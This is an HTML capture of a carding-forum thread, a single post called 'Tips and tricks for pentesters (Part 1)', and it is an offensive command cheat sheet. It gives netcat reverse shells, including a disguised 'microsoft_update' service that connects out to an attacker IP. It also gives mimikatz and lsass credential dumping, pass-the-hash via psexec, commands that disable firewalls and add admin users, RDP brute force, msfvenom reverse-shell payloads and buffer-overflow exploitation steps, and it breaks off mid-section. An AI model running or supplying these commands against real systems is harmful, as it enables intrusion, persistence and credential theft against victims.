@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en-gb">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>Tips and tricks for pentesters (Part 1) - Best Carding World</title>
+
+	<link rel="alternate" type="application/atom+xml" title="Feed - Best Carding World" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/feed.php">			<link rel="alternate" type="application/atom+xml" title="Feed - New Topics" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/feed.php?mode=topics">		<link rel="alternate" type="application/atom+xml" title="Feed - Forum - Penetration Tests" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/feed.php?f=43">	<link rel="alternate" type="application/atom+xml" title="Feed - Topic - Tips and tricks for pentesters (Part 1)" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/feed.php?f=43&amp;t=634">	
+	<link rel="canonical" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/viewtopic.php?t=634">
+
+<!--
+	phpBB style name: ne-blackgreen
+	Based on style:   prosilver (this is the default phpBB3 style)
+	Original author:  Tom Beddard ( http://www.subBlue.com/ )
+	Modified by: Bernhard ( http://www.nachtelb.de )
+-->
+
+
+<link href="./styles/prosilver/theme/common.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/links.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/content.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/buttons.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/cp.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/forms.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/colours.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/imageset.css?assets_version=6" rel="stylesheet"> 
+<link href="./styles/ne-blackgreen/theme/stylesheet.css?assets_version=6" rel="stylesheet" />
+<link href="./styles/prosilver/theme/responsive.css?assets_version=6" rel="stylesheet" media="all and (max-width: 700px)">
+
+
+<!--[if lte IE 9]>
+<link href="./styles/prosilver/theme/tweaks.css?assets_version=6" rel="stylesheet">
+<![endif]-->
+
+
+
+
+
+</head>
+<body id="phpbb" class="nojs notouch section-viewtopic ltr ">
+
+
+<div id="wrap">
+	<a id="top" class="anchor" accesskey="t"></a>
+	<div id="page-header">
+		<div class="headerbar" role="banner">
+			<div class="inner">
+
+			<div id="site-description">
+				<a id="logo" class="logo" href="./index.php" title="Home"><span class="imageset site_logo"></span></a>
+				<h1>Best Carding World</h1>
+				<p>Cardable Goods &amp; Money Transfers</p>
+				<p class="skiplink"><a href="#start_here">Skip to content</a></p>
+			</div>
+
+									<div id="search-box" class="search-box search-header" role="search">
+				<form action="./search.php" method="get" id="search">
+				<fieldset>
+					<input name="keywords" id="keywords" type="search" maxlength="128" title="Search for keywords" class="inputbox search tiny" size="20" value="" placeholder="Search…" />
+					<button class="button icon-button search-icon" type="submit" title="Search">Search</button>
+					<a href="./search.php" class="button icon-button search-adv-icon" title="Advanced search">Advanced search</a>
+					
+				</fieldset>
+				</form>
+			</div>
+			
+			</div>
+		</div>
+				<div class="navbar" role="navigation">
+	<div class="inner">
+
+	<ul id="nav-main" class="linklist bulletin" role="menubar">
+
+		<li id="quick-links" class="small-icon responsive-menu dropdown-container" data-skip-responsive="true">
+			<a href="#" class="responsive-menu-link dropdown-trigger">Quick links</a>
+			<div class="dropdown hidden">
+				<div class="pointer"><div class="pointer-inner"></div></div>
+				<ul class="dropdown-contents" role="menu">
+					
+											<li class="separator"></li>
+																								<li class="small-icon icon-search-unanswered"><a href="./search.php?search_id=unanswered" role="menuitem">Unanswered topics</a></li>
+						<li class="small-icon icon-search-active"><a href="./search.php?search_id=active_topics" role="menuitem">Active topics</a></li>
+						<li class="separator"></li>
+						<li class="small-icon icon-search"><a href="./search.php" role="menuitem">Search</a></li>
+					
+											<li class="separator"></li>
+												<li class="small-icon icon-team"><a href="./memberlist.php?mode=team" role="menuitem">The team</a></li>										<li class="separator"></li>
+
+									</ul>
+			</div>
+		</li>
+
+				<li class="small-icon icon-faq" data-skip-responsive="true"><a href="./faq.php" rel="help" title="Frequently Asked Questions" role="menuitem">FAQ</a></li>
+						
+			<li class="small-icon icon-logout rightside"  data-skip-responsive="true"><a href="./ucp.php?mode=login" title="Login" accesskey="x" role="menuitem">Login</a></li>
+					<li class="small-icon icon-register rightside" data-skip-responsive="true"><a href="./ucp.php?mode=register" role="menuitem">Register</a></li>
+						</ul>
+
+	<ul id="nav-breadcrumbs" class="linklist navlinks" role="menubar">
+						<li class="small-icon icon-home breadcrumbs">
+									<span class="crumb" itemtype="http://data-vocabulary.org/Breadcrumb" itemscope=""><a href="./index.php" accesskey="h" data-navbar-reference="index" itemprop="url"><span itemprop="title">Home</span></a></span>
+											<span class="crumb" itemtype="http://data-vocabulary.org/Breadcrumb" itemscope="" data-forum-id="42"><a href="./viewforum.php?f=42" itemprop="url"><span itemprop="title">Hackers Zone</span></a></span>
+															<span class="crumb" itemtype="http://data-vocabulary.org/Breadcrumb" itemscope="" data-forum-id="43"><a href="./viewforum.php?f=43" itemprop="url"><span itemprop="title">Penetration Tests</span></a></span>
+												</li>
+		
+					<li class="rightside responsive-search" style="display: none;"><a href="./search.php" title="View the advanced search options" role="menuitem">Search</a></li>
+			</ul>
+
+	</div>
+</div>
+	</div>
+
+	
+	<a id="start_here" class="anchor"></a>
+	<div id="page-body" role="main">
+		
+		
+<h2 class="topic-title"><a href="./viewtopic.php?f=43&amp;t=634">Tips and tricks for pentesters (Part 1)</a></h2>
+<!-- NOTE: remove the style="display: none" when you want to have the forum description on the topic body -->
+<div style="display: none !important;">Penetration testing<br /></div>
+
+
+<div class="action-bar top">
+
+	<div class="buttons">
+		
+			<a href="./posting.php?mode=reply&amp;f=43&amp;t=634" class="button icon-button reply-icon" title="Post a reply">
+			Post Reply		</a>
+	
+			</div>
+
+		<div class="dropdown-container dropdown-button-control topic-tools">
+		<span title="Topic tools" class="button icon-button tools-icon dropdown-trigger dropdown-select"></span>
+		<div class="dropdown hidden">
+			<div class="pointer"><div class="pointer-inner"></div></div>
+			<ul class="dropdown-contents">
+																								<li class="small-icon icon-print"><a href="./viewtopic.php?f=43&amp;t=634&amp;view=print" title="Print view" accesskey="p">Print view</a></li>							</ul>
+		</div>
+	</div>
+	
+			<div class="search-box" role="search">
+			<form method="get" id="topic-search" action="./search.php">
+			<fieldset>
+				<input class="inputbox search tiny"  type="search" name="keywords" id="search_keywords" size="20" placeholder="Search this topic…" />
+				<button class="button icon-button search-icon" type="submit" title="Search">Search</button>
+				<a href="./search.php" class="button icon-button search-adv-icon" title="Advanced search">Advanced search</a>
+				<input type="hidden" name="t" value="634" />
+<input type="hidden" name="sf" value="msgonly" />
+
+			</fieldset>
+			</form>
+		</div>
+	
+			<div class="pagination">
+			2 posts
+							&bull; Page <strong>1</strong> of <strong>1</strong>
+					</div>
+		</div>
+
+
+
+
+			<div id="p1454" class="post has-profile bg2">
+		<div class="inner">
+
+		<dl class="postprofile" id="profile1454">
+			<dt class="no-profile-rank has-avatar">
+				<div class="avatar-container">
+																<a href="./memberlist.php?mode=viewprofile&amp;u=179" class="avatar"><img class="avatar" src="./download/file.php?avatar=g2_1481306455.png" width="120" height="100" alt="User avatar" /></a>														</div>
+								<a href="./memberlist.php?mode=viewprofile&amp;u=179" style="color: #00BF00;" class="username-coloured">lazyaf</a>							</dt>
+
+									
+		<dd class="profile-posts"><strong>Posts:</strong> <a href="./search.php?author_id=179&amp;sr=posts">12</a></dd>		<dd class="profile-joined"><strong>Joined:</strong> Wed Oct 25, 2017 9:20 pm</dd>		
+		
+						
+						
+		</dl>
+
+		<div class="postbody">
+						<div id="post_content1454">
+
+						<h3 class="first"><a href="#p1454">Tips and tricks for pentesters (Part 1)</a></h3>
+
+													<ul class="post-buttons">
+																																									<li>
+							<a href="./posting.php?mode=quote&amp;f=43&amp;p=1454" title="Reply with quote" class="button icon-button quote-icon"><span>Quote</span></a>
+						</li>
+														</ul>
+							
+						<p class="author"><a href="./viewtopic.php?p=1454#p1454"><span class="imageset icon_post_target" title="Post">Post</span></a><span class="responsive-hide">by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=179" style="color: #00BF00;" class="username-coloured">lazyaf</a></strong> &raquo; </span>Tue Aug 21, 2018 3:29 pm </p>
+			
+			
+			
+			<div class="content">Nmap Full Web Vulnerable Scan<br /><br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>cd /usr/share/nmap/scripts/<br />wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz<br />nmap -sS -sV --script=vulscan/vulscan.nse target<br />nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target<br />nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target<br />nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target<br />nmap -sV --script=vuln target<br />nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</code></div><br /><br />Dirb Dir Bruteforce:<br /><br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</code></div><br /><br />Nikto web server scanner<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>nikto -C all -h http://IP</code></div><br /><br />WordPress Scanner<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan<br />./wpscan –url http://IP/ –enumerate p</code></div><br /><br />HTTP Fingerprinting<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip<br />cd httprint_301/linux/<br />./httprint -h http://IP -s signatures.txt</code></div><br /><br />SKIP Fish Scanner<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</code></div><br /><br />Nmap Ports Scan<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>1)decoy- masqurade nmap -D RND:10 &#91;target&#93; (Generates a random number of decoys)<br />1)decoy- masqurade nmap -D RND:10 &#91;target&#93; (Generates a random number of decoys)<br />2)fargement<br />3)data packed – like orginal one not scan packet<br />4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target<br />5)nmap –source-port 53 target<br />nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)<br />nmap -Pn -T2 -sV –randomize-hosts IP1,IP2<br />nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)<br />nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)<br />nmap -sA -PN -sN target<br />nmap -sS -sV -T5 -F -A -O target (version detection)<br />nmap -sU -v target (Udp)<br />nmap -sU -P0 (Udp)<br />nmap -sC 192.168.31.10-12 (all scan default)</code></div><br /><br />NC Scanning<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>nc -v -w 1 target -z 1-1000<br />for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done</code></div><br /><br />Unicornscan<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>us -H -msf -Iv 192.168.56.101 -p 1-65535<br />us -H -mU -Iv 192.168.56.101 -p 1-65535<br /><br />-H resolve hostnames during the reporting phase<br />-m scan mode (sf - tcp, U - udp)<br />-Iv - verbose</code></div><br /><br />Xprobe2 OS fingerprinting<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>xprobe2 -v -p tcp:80:open IP</code></div><br /><br />Samba Enumeration<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>nmblookup -A target<br />smbclient //MOUNT/share -I target -N<br />rpcclient -U &quot;&quot; target<br />enum4linux target</code></div><br /><br />SNMP Enumeration<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>snmpget -v 1 -c public IP<br />snmpwalk -v 1 -c public IP<br />snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</code></div><br /><br />Windows Useful cmds<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>net localgroup Users<br />net localgroup Administrators<br />search dir/s *.doc<br />system(&quot;start cmd.exe /k $cmd&quot;)<br />sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore<br />/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779<br />mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;<br />Procdump.exe -accepteula -ma lsass.exe lsass.dmp<br />mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;<br />C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits<br />C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits</code></div><br /><br />PuTTY Link tunnel<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>Forward remote port to local address<br />plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP</code></div><br /><br />Meterpreter portfwd<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># https://www.offensive-security.com/metasploit-unleashed/portfwd/<br /># forward remote port to local address<br />meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141<br />kali &gt; rdesktop 127.0.0.1:3389</code></div><br /><br />Enable RDP Access<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0<br />netsh firewall set service remoteadmin enable<br />netsh firewall set service remotedesktop enable</code></div><br /><br />Turn Off Windows Firewall<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>netsh firewall set opmode disable</code></div><br /><br />Meterpreter VNC\RDP<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>a<br /># https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/<br />run getgui -u admin -p 1234<br />run vnc -p 5043</code></div><br /><br />Add New user in Windows<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>net user test 1234 /add<br />net localgroup administrators test /add</code></div><br /><br />Mimikatz use<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>git clone https://github.com/gentilkiwi/mimikatz.git<br />privilege::debug<br />sekurlsa::logonPasswords full</code></div><br /><br />Passing the Hash<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>git clone https://github.com/byt3bl33d3r/pth-toolkit<br />pth-winexe -U hash //IP cmd<br /><br />or<br /><br />apt-get install freerdp-x11<br />xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP<br /><br />or<br /><br />meterpreter &gt; run post/windows/gather/hashdump<br />Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::<br />msf &gt; use exploit/windows/smb/psexec<br />msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp<br />msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c<br />msf exploit(psexec) &gt; exploit<br />meterpreter &gt; shell</code></div><br /><br />Hashcat password cracking<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>hashcat -m 400 -a 0 hash /root/rockyou.txt</code></div><br /><br />Netcat examples<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>c:&gt; nc -l -p 31337<br />#nc 192.168.0.10 31337<br />c:&gt; nc -v -w 30 -p 31337 -l &lt; secret.txt<br />#nc -v -w 2 192.168.0.10 31337 &gt; secret.txt</code></div><br /><br />Banner grabbing with NC<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>nc 192.168.0.10 80<br />GET / HTTP/1.1<br />Host: 192.168.0.10<br />User-Agent: Mozilla/4.0<br />Referrer: www.example.com<br />&lt;enter&gt;<br />&lt;enter&gt;</code></div><br /><br />Window reverse shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>c:&gt;nc -Lp 31337 -vv -e cmd.exe<br />nc 192.168.0.10 31337<br />c:&gt;nc example.com 80 -e cmd.exe<br />nc -lp 80<br /><br />nc -lp 31337 -e /bin/bash<br />nc 192.168.0.10 31337<br />nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000</code></div><br /><br />Find SUID\SGID root files<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># Find SUID root files<br />find / -user root -perm -4000 -print<br /><br /># Find SGID root files:<br />find / -group root -perm -2000 -print<br /><br /># Find SUID and SGID files owned by anyone:<br />find / -perm -4000 -o -perm -2000 -print<br /><br /># Find files that are not owned by any user:<br />find / -nouser -print<br /><br /># Find files that are not owned by any group:<br />find / -nogroup -print<br /><br /># Find symlinks and what they point to:<br />find / -type l -ls</code></div><br /><br />Python shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></div><br /><br />Python\Ruby\PHP HTTP Server<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>python2 -m SimpleHTTPServer<br />python3 -m http.server<br />ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start&quot;<br />php -S 0.0.0.0:8888</code></div><br /><br />Get PIDs of process<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>fuser -nv tcp 80<br />fuser -k -n tcp 80</code></div><br /><br />Hydra rdp Bruteforce<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</code></div><br /><br />Mount Remote Windows Share<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw</code></div><br /><br />Compiling Exploit in Kali<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>gcc -m32 -o output32 hello.c (32 bit)<br />gcc -m64 -o output hello.c (64 bit)</code></div><br /><br />Compiling Windows Exploits on Kali<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download<br />wine mingw-get-setup.exe<br />select mingw32-base<br />cd /root/.wine/drive_c/windows<br />wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip<br />cd /root/.wine/drive_c/MinGW/bin<br />wine gcc -o ability.exe /tmp/exploit.c -lwsock32<br />wine ability.exe</code></div><br /><br />NASM Commands<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>nasm -f bin -o payload.bin payload.asm<br />nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload</code></div><br /><br />SSH Pivoting<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>ssh -D 127.0.0.1:1080 -p 22 user@IP<br />Add socks4 127.0.0.1 1080 in /etc/proxychains.conf<br />proxychains commands target<br />SSH Pivoting from One Network to Another<br />ssh -D 127.0.0.1:1080 -p 22 user1@IP1<br />Add socks4 127.0.0.1 1080 in /etc/proxychains.conf<br />proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2<br />Add socks4 127.0.0.1 1081 in /etc/proxychains.conf<br />proxychains commands target</code></div><br /><br />Pivoting Using metasploit<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>route add X.X.X.X 255.255.255.0 1<br />use auxiliary/server/socks4a<br />run<br />proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E<br /><br />or<br /><br /># https://www.offensive-security.com/metasploit-unleashed/pivoting/<br />meterpreter &gt; ipconfig<br />IP Address&nbsp; : 10.1.13.3<br />meterpreter &gt; run autoroute -s 10.1.13.0/24<br />meterpreter &gt; run autoroute -p<br />10.1.13.0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 255.255.255.0&nbsp; &nbsp; &nbsp; Session 1<br />meterpreter &gt; Ctrl+Z<br />msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec<br />msf exploit(psexec) &gt; set RHOST 10.1.13.2<br />msf exploit(psexec) &gt; exploit<br />meterpreter &gt; ipconfig<br />IP Address&nbsp; : 10.1.13.2</code></div><br /><br />Exploit-DB search using CSV File<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>git clone https://github.com/offensive-security/exploit-database.git<br />cd exploit-database<br />./searchsploit –u<br />./searchsploit apache 2.2<br />./searchsploit &quot;Linux Kernel&quot;<br /><br />cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3</code></div><br /><br />MSF Payloads<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe<br />msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php<br />msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp<br />msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c</code></div><br /><br />MSF Linux Reverse Meterpreter Binary<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</code></div><br /><br />MSF Reverse Shell (C Shellcode)<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c</code></div><br /><br />MSF Reverse Shell Python Script<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</code></div><br /><br />MSF Reverse ASP Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</code></div><br /><br />MSF Reverse Bash Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</code></div><br /><br />MSF Reverse PHP Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php<br />add &lt;?php at the beginning<br />perl -i~ -0777pe's/^/&lt;?php \n/' shell.php</code></div><br /><br />MSF Reverse Win Bin<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</code></div><br /><br />Linux Security Commands<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># find programs with a set uid bit<br />find / -uid 0 -perm -4000<br /><br /># find things that are world writable<br />find / -perm -o=w<br /><br /># find names with dots and spaces, there shouldn’t be any<br />find / -name &quot; &quot; -print<br />find / -name &quot;..&quot; -print<br />find / -name &quot;. &quot; -print<br />find / -name &quot; &quot; -print<br /><br /># find files that are not owned by anyone<br />find / -nouser<br /><br /># look for files that are unlinked<br />lsof +L1<br /><br /># get information about procceses with open ports<br />lsof -i<br /><br /># look for weird things in arp<br />arp -a<br /><br /># look at all accounts including AD<br />getent passwd<br /><br /># look at all groups and membership including AD<br />getent group<br /><br /># list crontabs for all users including AD<br />for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done<br /><br /># generate random passwords<br />cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+{}|:&lt;&gt;?=’|fold -w 12| head -n 4<br /><br /># find all immutable files, there should not be any<br />find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’<br /><br /># fix immutable files<br />chattr -i file</code></div><br /><br />Win Buffer Overflow Exploit Commands<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f c<br />msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f c<br /><br />COMMONLY USED BAD CHARACTERS:<br />\x00\x0a\x0d\x20&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; For http request<br />\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Ending with (0\n\r_)<br /><br /># Useful Commands:<br />pattern create<br />pattern offset (EIP Address)<br />pattern offset (ESP Address)<br />add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )<br /><br />!pvefindaddr pattern_create 5000<br />!pvefindaddr suggest<br />!pvefindaddr modules<br />!pvefindaddr nosafeseh<br /><br />!mona config -set workingfolder C:\Mona\%p<br />!mona config -get workingfolder<br />!mona mod<br />!mona bytearray -b &quot;\x00\x0a&quot;<br />!mona pc 5000<br />!mona po EIP<br />!mona suggest</code></div><br /><br />SEH - Structured Exception Handling<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH<br />!mona suggest<br />!mona nosafeseh<br />nseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)<br />iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)</code></div><br /><br />ROP (DEP)<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># https://en.wikipedia.org/wiki/Return-oriented_programming<br /># https://en.wikipedia.org/wiki/Data_Execution_Prevention<br />!mona modules<br />!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;<br />!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest)</code></div><br /><br />ASLR - Address space layout randomization<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># https://en.wikipedia.org/wiki/Address_space_layout_randomization<br />!mona noaslr</code></div><br /><br />EGG Hunter techniques<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/<br /># http://www.fuzzysecurity.com/tutorials/expDev/4.html<br />!mona jmp -r esp<br />!mona egg -t lxxl<br />\xeb\xc4 (jump backward -60)<br />buff=lxxllxxl+shell<br />!mona egg -t 'w00t'</code></div><br /><br />GDB Debugger Commands<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># Setting Breakpoint<br />break *_start<br /><br /># Execute Next Instruction<br />next<br />step<br />n<br />s<br /><br /># Continue Execution<br />continue<br />c<br /><br /># Data<br />checking 'REGISTERS' and 'MEMORY'<br /><br /># Display Register Values: (Decimal,Binary,Hex)<br />print /d –&gt; Decimal<br />print /t –&gt; Binary<br />print /x –&gt; Hex<br />O/P :<br />(gdb) 